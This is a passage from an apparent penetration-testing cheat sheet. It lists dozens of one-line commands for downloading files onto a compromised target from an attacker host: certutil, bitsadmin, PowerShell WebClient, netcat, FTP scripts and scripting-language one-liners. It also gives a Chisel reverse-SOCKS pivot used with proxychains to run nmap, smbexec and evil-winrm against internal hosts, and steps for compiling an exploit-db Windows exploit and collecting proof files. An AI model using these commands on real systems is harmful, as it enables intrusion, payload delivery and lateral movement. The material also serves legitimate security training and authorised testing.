| ruby -rwebrick -e’WEBrick::HTTPServer.new(:Port => PORT, :DocumentRoot => Dir.pwd).start’	| Ruby web server using the Web brick library |
| ruby -run -e httpd . -p [PORT]	| Ruby simple http server |
| “C:\Program Files (x86)\IIS Express\iisexpress.exe” /path:C: /port:PORT	| Microsoftg IIS Express |
| base64 file;	| Encoding the the file using base 64 and decoding it in the target machine |

#### Downloading files
| Command  | Description |
| ------------- | ------------- |
| wget http://ip-addr:port/file [-o output_file]	| Wget comes preinstalled with most Linux systems |
| curl http://ip-addr:port/file -o output_file	| Curl comes preinstalled with most Linux and some Windows systems |
| certutil -urlcache -split -f “http://ip-addr:port/file” output_file	| Certutil is a Windows builtin command line tool |
| powershell -c Invoke-WebRequest -Uri http://ip-addr:port/file -OutFile output_file; | Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| powershell -c (New-Object Net.WebClient).DownloadFile(‘http://ip-addr:port/file’, ‘output_file’)	| Powershell Invoke-WebRequest cmdlet or the System.Net.WebClient class |
| bitsadmin /transfer job /download /priority high http://IP_ADDR/file output_file	| Bitsadmin Windows command-line tool |
| nc -nv IP_ADDR 443 > file	| Netcat command to download files from a Netcat listener |
| nc -q 0-lvp 443 > file	| Netcat listener to receive files |
| copy \IP_ADDR\SHARE\output_file	| Copy command to download files from an SMB share |
| smbget smb://domain;user[:password@]server/share/path/file	| smbget utility to download files from a Samba share |
| wget ftp://user:password@IP_ADDR/path/file -o output_file | wget stuff via FTP |
| - FTP | FTP |
| echo open 192.168.1.64 21> ftp.txt | FTP |
| echo anonymous>> ftp.txt | FTP |
| echo ftp@ftp.com>> ftp.txt | FTP |
| echo bin >> ftp.txt | FTP |
| echo get test.txt >> ftp.txt | FTP |
| echo bye >> ftp.txt | FTP |
| ftp -s:ftp.txt	| Wget and FTP to download files from an FTP server |
| tftp |	tftp -i IP_ADDR {GET | PUT} file |
| scp /path/file username@IP_ADDR:/path/file	| Secure File Copy SSH tool |
| https://gist.github.com/Richienb/51021a1c16995a07478dfa20a6db725c	| Windows Virtual Basic scripts |
| php -r “file_put_contents(‘output_file’, fopen(‘http://ip-addr:port/file’, ‘r’));”	| PHP file_put_contents function |
| python -c ‘from urllib import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’; | The Python urlretrieve function which is part of the urllib library can be used to download files |
| python3 -c ‘from urllib.request import urlretrieve; urlretrieve(“http://ip-addr:port/file”, “output_file”)’	| The Python urlretrieve function which is part of the urllib library can be used to download files |
| perl -MLWP::Simple -e ‘getstore(“http://IP_ADDR/file”, “out_file”)’; | Library for WWW in Perl |
| perl -e ‘use LWP::Simple; getstore(“http://IP_ADDR/file”, “out_file”)’	| Library for WWW in Perl |
| ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
| echo -n “base64-output” > file	| Decoding the base64 output of the file |

## Pivoting for lateral movement
### Using Chisel
- https://blog.mkiesel.ch/posts/oscp_pivoting/
- https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot

```bash
#On your attacking machine (192.168.60.200) setup a Chisel server with:
#PORT = port for the Chisel traffic
#socks5 = to setup a SOCKS5 proxy
#reverse = to tell Chisel to wait for a connection from a client
chisel server --port 1080 --sock5 --reverse

#On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
#Chisel
#1080 is the default port of the Chisel reverse proxy
socks5 127.0.0.1 1080

#on windows jumphost, setup Chisel Client with:
#IP = The IP address of your Chisel server
#PORT = The port you set on your Chisel sever
#R:socks = enables the reverse SOCKS proxy
#max-retry-count 1 = to exit Chisel when you kill your server
.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks

#You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
#The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
proxychains -q nmap -sC -sV 10.0.60.99
proxychains -q ssh user@10.0.60.99
proxychains -q mysql -u dbuser -h 10.0.60.99
proxychains -q impacket-smbexec domain\user:password -target-ip  10.0.60.99
proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p 'password'

```

## compiling windows exploit on kali
```bash
apt install mingw-w64
i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32
```

## Post exploitation evidence
```bash
cat /root/proof.txt
whoami
ip a

type local.txt
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
systeminfo
ipconfig
```
